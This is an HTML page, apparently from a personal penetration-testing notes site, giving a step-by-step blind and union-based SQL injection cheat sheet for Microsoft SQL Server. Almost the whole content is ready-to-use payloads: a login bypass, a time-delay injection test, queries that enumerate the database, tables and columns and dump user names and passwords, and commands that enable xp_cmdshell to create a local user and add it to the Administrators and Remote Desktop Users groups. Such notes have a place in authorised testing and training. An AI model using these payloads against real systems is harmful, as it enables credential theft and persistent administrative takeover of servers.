@@ -1,0 +1,204 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Blind MSSQL Injection page &mdash; docs 0.1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=2709fde1"></script>
+      <script src="../../_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="../../_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Oracle DB Union based Injection" href="OracleDBSQLunioninjection.html" />
+    <link rel="prev" title="SQL Helpful Tips" href="mariadb.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            docs
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../coding/index.html">Coding Homepage</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../index.html">Hacking Home Page</a><ul class="current">
+<li class="toctree-l2 current"><a class="reference internal" href="index.html">SQLI Home Page</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="mariadb.html">SQL Helpful Tips</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Blind MSSQL Injection page</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#login-page">Login Page</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#test-injection">Test Injection</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#find-db-name">Find DB name</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#list-tables">List tables</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#display-table-column-1">Display table column 1</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#display-username-and-password">Display Username and Password</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#using-xp-cmdshell-to-run-commands-create-a-user">Using xp_cmdshell to run commands … create a user</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="OracleDBSQLunioninjection.html">Oracle DB Union based Injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../FWbypass/index.html">Hacking Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../enum/index.html">Enumeration Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../AD/index.html">Active Directory  Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../metasploit/index.html">Metasploit Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../BoF/index.html">BoF Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../shells/index.html">Reverse Shells Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PE/index.html">PE Homepage</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../pivot/index.html">Network Pivot Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../wireshark.html">Wireshark tips</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PWdecrypt/index.html">Password Decryption Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../exploits/index.html">Exploits Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../github/index.html">Github Hacking Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../C2/index.html">C2 Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../notableKaliLocations/index.html">Notable Kali Locations Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../defense/index.html">Cyber Defense Home Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../IT/index.html">IT Homepage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../interview_questions/index.html">interview questions</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../walkthroughs/index.html">Walkthroughs Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../photoshop/index.html">Photoshop home Page</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">docs</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../index.html">Hacking Home Page</a></li>
+          <li class="breadcrumb-item"><a href="index.html">SQLI Home Page</a></li>
+      <li class="breadcrumb-item active">Blind MSSQL Injection page</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/hacking/SQL/blindMSSQLI.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="blind-mssql-injection-page">
+<h1>Blind MSSQL Injection page<a class="headerlink" href="#blind-mssql-injection-page" title="Link to this heading"></a></h1>
+<section id="login-page">
+<h2>Login Page<a class="headerlink" href="#login-page" title="Link to this heading"></a></h2>
+<p>For login page try the following to login</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">admin&#39; or 1=1 --</span>
+</pre></div>
+</div>
+</section>
+<section id="test-injection">
+<h2>Test Injection<a class="headerlink" href="#test-injection" title="Link to this heading"></a></h2>
+<p>First make sure it is injectable by a wait command</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; waitfor delay &#39;00:00:10&#39;--</span>
+</pre></div>
+</div>
+<p>The goal of this is to find where the null’s error out. If it errors out do the last NULL. So In this case, the third NULL errored out and we are left with two NULLs that aren’t errored.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; order by 2 --</span>
+<span class="go">&#39; union select null,null --</span>
+</pre></div>
+</div>
+<p><strong>Note, the rest of the commands are assuming the NULL is two.</strong></p>
+</section>
+<section id="find-db-name">
+<h2>Find DB name<a class="headerlink" href="#find-db-name" title="Link to this heading"></a></h2>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; union all select db_name(), 2 --</span>
+</pre></div>
+</div>
+</section>
+<section id="list-tables">
+<h2>List tables<a class="headerlink" href="#list-tables" title="Link to this heading"></a></h2>
+<p>Assume that this output shows the tables <cite>albums, singles, concerts, users, songs</cite>.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; union all select table_name, 2 from information_schema.tables --</span>
+</pre></div>
+</div>
+</section>
+<section id="display-table-column-1">
+<h2>Display table column 1<a class="headerlink" href="#display-table-column-1" title="Link to this heading"></a></h2>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; union all select column_name, 2 from information_schema.columns where table_name=&#39;users&#39; order by 1 --</span>
+</pre></div>
+</div>
+</section>
+<section id="display-username-and-password">
+<h2>Display Username and Password<a class="headerlink" href="#display-username-and-password" title="Link to this heading"></a></h2>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; union all select name+&#39; &#39;+pass, 2 from users--</span>
+</pre></div>
+</div>
+</section>
+<section id="using-xp-cmdshell-to-run-commands-create-a-user">
+<h2>Using xp_cmdshell to run commands … create a user<a class="headerlink" href="#using-xp-cmdshell-to-run-commands-create-a-user" title="Link to this heading"></a></h2>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&#39; EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;--</span>
+<span class="go">&#39; EXEC xp_cmdshell &#39;net user &lt;userame&gt; &lt;password&gt; /add&#39;;--</span>
+<span class="go">&#39; EXEC xp_cmdshell &#39;net localgroup Administrators &lt;username&gt; /add&#39;;--</span>
+<span class="go">&#39; EXEC xp_cmdshell &#39;net localgroup &quot;Remote Desktop Users&quot; &lt;username&gt; /add&#39;;--</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="mariadb.html" class="btn btn-neutral float-left" title="SQL Helpful Tips" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="OracleDBSQLunioninjection.html" class="btn btn-neutral float-right" title="Oracle DB Union based Injection" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025, mynameisORIG.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
